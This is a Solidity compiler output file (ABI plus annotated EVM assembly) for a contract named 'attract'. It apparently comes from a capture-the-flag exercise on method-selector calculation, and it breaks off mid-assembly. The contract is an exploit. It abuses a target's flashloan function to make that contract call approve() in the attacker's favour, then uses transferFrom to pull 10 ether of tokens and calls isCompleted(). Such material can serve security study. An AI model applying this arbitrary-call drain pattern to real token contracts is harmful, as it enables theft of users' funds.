{
	"shoot/3/方法选择器的计算/1.sol": {
		"attract": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract check",
							"name": "addr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "att",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attract1",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getdata",
					"outputs": [
						{
							"internalType": "bytes",
							"name": "",
							"type": "bytes"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"shoot/3/方法选择器的计算/1.sol\":5212:6647  contract attract{\r... */\n  mstore(0x40, 0x80)\n    /* \"shoot/3/方法选择器的计算/1.sol\":5269:5359  constructor(check addr) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"shoot/3/方法选择器的计算/1.sol\":5317:5321  addr */\n  dup1\n    /* \"shoot/3/方法选择器的计算/1.sol\":5311:5314  che */\n  0x00\n  dup1\n    /* \"shoot/3/方法选择器的计算/1.sol\":5311:5321  che = addr */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"shoot/3/方法选择器的计算/1.sol\":5340:5343  che */\n  0x00\n  dup1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"shoot/3/方法选择器的计算/1.sol\":5340:5349  che.erc20 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x785e9e86\n    /* \"shoot/3/方法选择器的计算/1.sol\":5340:5351  che.erc20() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  dup1\n  extcodesize\n  iszero\n  dup1\n  iszero\n  tag_6\n  jumpi\n  0x00\n  dup1\n  revert\ntag_6:\n  pop\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_8\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_8:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_9\n  swap2\n  swap1\n  tag_10\n  jump\t// in\ntag_9:\n    /* \"shoot/3/方法选择器的计算/1.sol\":5332:5337  erc20 */\n  0x01\n  0x00\n    /* \"shoot/3/方法选择器的计算/1.sol\":5332:5351  erc20 = che.erc20() */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"shoot/3/方法选择器的计算/1.sol\":5269:5359  constructor(check addr) public {\r... */\n  pop\n    /* \"shoot/3/方法选择器的计算/1.sol\":5212:6647  contract attract{\r... */\n  jump(tag_11)\n    /* \"#utility.yul\":7:176   */\ntag_13:\n  0x00\n    /* \"#utility.yul\":108:114   */\n  dup2\n    /* \"#utility.yul\":102:115   */\n  mload\n    /* \"#utility.yul\":93:115   */\n  swap1\n  pop\n    /* \"#utility.yul\":124:170   */\n  tag_15\n    /* \"#utility.yul\":164:169   */\n  dup2\n    /* \"#utility.yul\":124:170   */\n  tag_16\n  jump\t// in\ntag_15:\n    /* \"#utility.yul\":83:176   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":182:351   */\ntag_17:\n  0x00\n    /* \"#utility.yul\":283:289   */\n  dup2\n    /* \"#utility.yul\":277:290   */\n  mload\n    /* \"#utility.yul\":268:290   */\n  swap1\n  pop\n    /* \"#utility.yul\":299:345   */\n  tag_19\n    /* \"#utility.yul\":339:344   */\n  dup2\n    /* \"#utility.yul\":299:345   */\n  tag_20\n  jump\t// in\ntag_19:\n    /* \"#utility.yul\":258:351   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":357:667   */\ntag_10:\n  0x00\n    /* \"#utility.yul\":489:491   */\n  0x20\n    /* \"#utility.yul\":477:486   */\n  dup3\n    /* \"#utility.yul\":468:475   */\n  dup5\n    /* \"#utility.yul\":464:487   */\n  sub\n    /* \"#utility.yul\":460:492   */\n  slt\n    /* \"#utility.yul\":457:459   */\n  iszero\n  tag_22\n  jumpi\n    /* \"#utility.yul\":505:506   */\n  0x00\n    /* \"#utility.yul\":502:503   */\n  dup1\n    /* \"#utility.yul\":495:507   */\n  revert\n    /* \"#utility.yul\":457:459   */\ntag_22:\n    /* \"#utility.yul\":548:549   */\n  0x00\n    /* \"#utility.yul\":573:650   */\n  tag_23\n    /* \"#utility.yul\":642:649   */\n  dup5\n    /* \"#utility.yul\":633:639   */\n  dup3\n    /* \"#utility.yul\":622:631   */\n  dup6\n    /* \"#utility.yul\":618:640   */\n  add\n    /* \"#utility.yul\":573:650   */\n  tag_13\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":563:650   */\n  swap2\n  pop\n    /* \"#utility.yul\":519:660   */\n  pop\n    /* \"#utility.yul\":447:667   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":673:983   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":805:807   */\n  0x20\n    /* \"#utility.yul\":793:802   */\n  dup3\n    /* \"#utility.yul\":784:791   */\n  dup5\n    /* \"#utility.yul\":780:803   */\n  sub\n    /* \"#utility.yul\":776:808   */\n  slt\n    /* \"#utility.yul\":773:775   */\n  iszero\n  tag_25\n  jumpi\n    /* \"#utility.yul\":821:822   */\n  0x00\n    /* \"#utility.yul\":818:819   */\n  dup1\n    /* \"#utility.yul\":811:823   */\n  revert\n    /* \"#utility.yul\":773:775   */\ntag_25:\n    /* \"#utility.yul\":864:865   */\n  0x00\n    /* \"#utility.yul\":889:966   */\n  tag_26\n    /* \"#utility.yul\":958:965   */\n  dup5\n    /* \"#utility.yul\":949:955   */\n  dup3\n    /* \"#utility.yul\":938:947   */\n  dup6\n    /* \"#utility.yul\":934:956   */\n  add\n    /* \"#utility.yul\":889:966   */\n  tag_17\n  jump\t// in\ntag_26:\n    /* \"#utility.yul\":879:966   */\n  swap2\n  pop\n    /* \"#utility.yul\":835:976   */\n  pop\n    /* \"#utility.yul\":763:983   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":989:1085   */\ntag_27:\n  0x00\n    /* \"#utility.yul\":1055:1079   */\n  tag_29\n    /* \"#utility.yul\":1073:1078   */\n  dup3\n    /* \"#utility.yul\":1055:1079   */\n  tag_30\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1044:1079   */\n  swap1\n  pop\n    /* \"#utility.yul\":1034:1085   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1091:1200   */\ntag_31:\n  0x00\n    /* \"#utility.yul\":1170:1194   */\n  tag_33\n    /* \"#utility.yul\":1188:1193   */\n  dup3\n    /* \"#utility.yul\":1170:1194   */\n  tag_27\n  jump\t// in\ntag_33:\n    /* \"#utility.yul\":1159:1194   */\n  swap1\n  pop\n    /* \"#utility.yul\":1149:1200   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1206:1315   */\ntag_34:\n  0x00\n    /* \"#utility.yul\":1285:1309   */\n  tag_36\n    /* \"#utility.yul\":1303:1308   */\n  dup3\n    /* \"#utility.yul\":1285:1309   */\n  tag_27\n  jump\t// in\ntag_36:\n    /* \"#utility.yul\":1274:1309   */\n  swap1\n  pop\n    /* \"#utility.yul\":1264:1315   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1321:1447   */\ntag_30:\n  0x00\n    /* \"#utility.yul\":1398:1440   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":1391:1396   */\n  dup3\n    /* \"#utility.yul\":1387:1441   */\n  and\n    /* \"#utility.yul\":1376:1441   */\n  swap1\n  pop\n    /* \"#utility.yul\":1366:1447   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1453:1601   */\ntag_16:\n    /* \"#utility.yul\":1539:1576   */\n  tag_39\n    /* \"#utility.yul\":1570:1575   */\n  dup2\n    /* \"#utility.yul\":1539:1576   */\n  tag_31\n  jump\t// in\ntag_39:\n    /* \"#utility.yul\":1532:1537   */\n  dup2\n    /* \"#utility.yul\":1529:1577   */\n  eq\n    /* \"#utility.yul\":1519:1521   */\n  tag_40\n  jumpi\n    /* \"#utility.yul\":1591:1592   */\n  0x00\n    /* \"#utility.yul\":1588:1589   */\n  dup1\n    /* \"#utility.yul\":1581:1593   */\n  revert\n    /* \"#utility.yul\":1519:1521   */\ntag_40:\n    /* \"#utility.yul\":1509:1601   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1607:1755   */\ntag_20:\n    /* \"#utility.yul\":1693:1730   */\n  tag_42\n    /* \"#utility.yul\":1724:1729   */\n  dup2\n    /* \"#utility.yul\":1693:1730   */\n  tag_34\n  jump\t// in\ntag_42:\n    /* \"#utility.yul\":1686:1691   */\n  dup2\n    /* \"#utility.yul\":1683:1731   */\n  eq\n    /* \"#utility.yul\":1673:1675   */\n  tag_43\n  jumpi\n    /* \"#utility.yul\":1745:1746   */\n  0x00\n    /* \"#utility.yul\":1742:1743   */\n  dup1\n    /* \"#utility.yul\":1735:1747   */\n  revert\n    /* \"#utility.yul\":1673:1675   */\ntag_43:\n    /* \"#utility.yul\":1663:1755   */\n  pop\n  jump\t// out\n    /* \"shoot/3/方法选择器的计算/1.sol\":5212:6647  contract attract{\r... */\ntag_11:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"shoot/3/方法选择器的计算/1.sol\":5212:6647  contract attract{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x05c009db\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x4fa10cfc\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xba36f423\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"shoot/3/方法选择器的计算/1.sol\":6378:6642  function attract1() public {\r... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n        /* \"shoot/3/方法选择器的计算/1.sol\":5963:6115  function getdata() public view returns(bytes memory){\r... */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/方法选择器的计算/1.sol\":6121:6372  function att() public {\r... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6378:6642  function attract1() public {\r... */\n    tag_7:\n        /* \"shoot/3/方法选择器的计算/1.sol\":6416:6427  bytes4 data */\n      0x00\n        /* \"shoot/3/方法选择器的计算/1.sol\":6430:6452  che.checkData.selector */\n      shl(0xe0, 0x9f29381d)\n        /* \"shoot/3/方法选择器的计算/1.sol\":6416:6452  bytes4 data = che.checkData.selector */\n      swap1\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6463:6466  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6463:6476  che.flashloan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3e666d20\n        /* \"shoot/3/方法选择器的计算/1.sol\":6485:6490  erc20 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6500:6503  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6505:6506  0 */\n      0x00\n        /* \"shoot/3/方法选择器的计算/1.sol\":6507:6511  0xa0 */\n      0xa0\n        /* \"shoot/3/方法选择器的计算/1.sol\":6512:6517  false */\n      0x00\n        /* \"shoot/3/方法选择器的计算/1.sol\":6518:6527  getdata() */\n      tag_15\n        /* \"shoot/3/方法选择器的计算/1.sol\":6518:6525  getdata */\n      tag_9\n        /* \"shoot/3/方法选择器的计算/1.sol\":6518:6527  getdata() */\n      jump\t// in\n    tag_15:\n        /* \"shoot/3/方法选择器的计算/1.sol\":6463:6528  che.flashloan(address(erc20),address(che),0,0xa0,false,getdata()) */\n      mload(0x40)\n      dup8\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_16\n      swap7\n      swap6\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6539:6542  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6539:6548  che.erc20 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x785e9e86\n        /* \"shoot/3/方法选择器的计算/1.sol\":6539:6550  che.erc20() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_24\n      swap2\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"shoot/3/方法选择器的计算/1.sol\":6539:6563  che.erc20().transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"shoot/3/方法选择器的计算/1.sol\":6572:6575  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6586:6590  this */\n      address\n        /* \"shoot/3/方法选择器的计算/1.sol\":6593:6601  10 ether */\n      0x8ac7230489e80000\n        /* \"shoot/3/方法选择器的计算/1.sol\":6539:6602  che.erc20().transferFrom(address(che), address(this), 10 ether) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_26\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_31\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6613:6616  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6613:6628  che.isCompleted */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x66a3fdb1\n        /* \"shoot/3/方法选择器的计算/1.sol\":6629:6633  data */\n      dup3\n        /* \"shoot/3/方法选择器的计算/1.sol\":6613:6634  che.isCompleted(data) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_33\n      swap2\n      swap1\n      tag_34\n      jump\t// in\n    tag_33:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_35:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_37:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6378:6642  function attract1() public {\r... */\n      pop\n      jump\t// out\n        /* \"shoot/3/方法选择器的计算/1.sol\":5963:6115  function getdata() public view returns(bytes memory){\r... */\n    tag_9:\n        /* \"shoot/3/方法选择器的计算/1.sol\":6002:6014  bytes memory */\n      0x60\n        /* \"shoot/3/方法选择器的计算/1.sol\":6092:6096  this */\n      address\n        /* \"shoot/3/方法选择器的计算/1.sol\":6098:6106  10 ether */\n      0x8ac7230489e80000\n        /* \"shoot/3/方法选择器的计算/1.sol\":6033:6107  abi.encodeWithSignature(\"approve(address,uint256)\",address(this),10 ether) */\n      add(0x24, mload(0x40))\n      tag_39\n      swap3\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_39:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x095ea7b300000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6026:6107  return abi.encodeWithSignature(\"approve(address,uint256)\",address(this),10 ether) */\n      swap1\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":5963:6115  function getdata() public view returns(bytes memory){\r... */\n      swap1\n      jump\t// out\n        /* \"shoot/3/方法选择器的计算/1.sol\":6121:6372  function att() public {\r... */\n    tag_13:\n        /* \"shoot/3/方法选择器的计算/1.sol\":6154:6165  bytes4 data */\n      0x00\n        /* \"shoot/3/方法选择器的计算/1.sol\":6168:6190  che.checkData.selector */\n      shl(0xe0, 0x9f29381d)\n        /* \"shoot/3/方法选择器的计算/1.sol\":6154:6190  bytes4 data = che.checkData.selector */\n      swap1\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6201:6204  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6201:6214  che.flashloan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3e666d20\n        /* \"shoot/3/方法选择器的计算/1.sol\":6223:6228  erc20 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6238:6241  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6243:6244  0 */\n      0x00\n        /* \"shoot/3/方法选择器的计算/1.sol\":6245:6249  0xa0 */\n      0xa0\n        /* \"shoot/3/方法选择器的计算/1.sol\":6250:6255  false */\n      0x00\n        /* \"shoot/3/方法选择器的计算/1.sol\":6256:6265  getdata() */\n      tag_42\n        /* \"shoot/3/方法选择器的计算/1.sol\":6256:6263  getdata */\n      tag_9\n        /* \"shoot/3/方法选择器的计算/1.sol\":6256:6265  getdata() */\n      jump\t// in\n    tag_42:\n        /* \"shoot/3/方法选择器的计算/1.sol\":6201:6266  che.flashloan(address(erc20),address(che),0,0xa0,false,getdata()) */\n      mload(0x40)\n      dup8\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_43\n      swap7\n      swap6\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_43:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_44:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_46\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_46:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6277:6282  erc20 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6277:6295  erc20.transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"shoot/3/方法选择器的计算/1.sol\":6304:6307  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6317:6321  this */\n      address\n        /* \"shoot/3/方法选择器的计算/1.sol\":6323:6331  10 ether */\n      0x8ac7230489e80000\n        /* \"shoot/3/方法选择器的计算/1.sol\":6277:6332  erc20.transferFrom(address(che),address(this),10 ether) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_47\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_47:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_51\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_51:\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6343:6346  che */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/方法选择器的计算/1.sol\":6343:6358  che.isCompleted */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x66a3fdb1\n        /* \"shoot/3/方法选择器的计算/1.sol\":6359:6363  data */\n      dup3\n        /* \"shoot/3/方法选择器的计算/1.sol\":6343:6364  che.isCompleted(data) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_52\n      swap2\n      swap1\n      tag_34\n      jump\t// in\n    tag_52:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_53:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_55\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_55:\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/3/方法选择器的计算/1.sol\":6121:6372  function att() public {\r... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:144   */\n    tag_57:\n      0x00\n        /* \"#utility.yul\":92:98   */\n      dup2\n        /* \"#utility.yul\":86:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":108:138   */\n      tag_59\n        /* \"#utility.yul\":132:137   */\n      dup2\n        /* \"#utility.yul\":108:138   */\n      tag_60\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":67:144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":150:319   */\n    tag_61:\n      0x00\n        /* \"#utility.yul\":251:257   */\n      dup2\n        /* \"#utility.yul\":245:258   */\n      mload\n        /* \"#utility.yul\":236:258   */\n      swap1\n      pop\n        /* \"#utility.yul\":267:313   */\n      tag_63\n        /* \"#utility.yul\":307:312   */\n      dup2\n        /* \"#utility.yul\":267:313   */\n      tag_64\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":226:319   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":325:603   */\n    tag_32:\n      0x00\n        /* \"#utility.yul\":441:443   */\n      0x20\n        /* \"#utility.yul\":429:438   */\n      dup3\n        /* \"#utility.yul\":420:427   */\n      dup5\n        /* \"#utility.yul\":416:439   */\n      sub\n        /* \"#utility.yul\":412:444   */\n      slt\n        /* \"#utility.yul\":409:411   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":457:458   */\n      0x00\n        /* \"#utility.yul\":454:455   */\n      dup1\n        /* \"#utility.yul\":447:459   */\n      revert\n        /* \"#utility.yul\":409:411   */\n    tag_66:\n        /* \"#utility.yul\":500:501   */\n      0x00\n        /* \"#utility.yul\":525:586   */\n      tag_67\n        /* \"#utility.yul\":578:585   */\n      dup5\n        /* \"#utility.yul\":569:575   */\n      dup3\n        /* \"#utility.yul\":558:567   */\n      dup6\n        /* \"#utility.yul\":554:576   */\n      add\n        /* \"#utility.yul\":525:586   */\n      tag_57\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":515:586   */\n      swap2\n      pop\n        /* \"#utility.yul\":471:596   */\n      pop\n        /* \"#utility.yul\":399:603   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":609:919   */\n    tag_25:\n      0x00\n        /* \"#utility.yul\":741:743   */\n      0x20\n        /* \"#utility.yul\":729:738   */\n      dup3\n        /* \"#utility.yul\":720:727   */\n      dup5\n        /* \"#utility.yul\":716:739   */\n      sub\n        /* \"#utility.yul\":712:744   */\n      slt\n        /* \"#utility.yul\":709:711   */\n      iszero\n      tag_69\n      jumpi\n        /* \"#utility.yul\":757:758   */\n      0x00\n        /* \"#utility.yul\":754:755   */\n      dup1\n        /* \"#utility.yul\":747:759   */\n      revert\n        /* \"#utility.yul\":709:711   */\n    tag_69:\n        /* \"#utility.yul\":800:801   */\n      0x00\n        /* \"#utility.yul\":825:902   */\n      tag_70\n        /* \"#utility.yul\":894:901   */\n      dup5\n        /* \"#utility.yul\":885:891   */\n      dup3\n        /* \"#utility.yul\":874:883   */\n 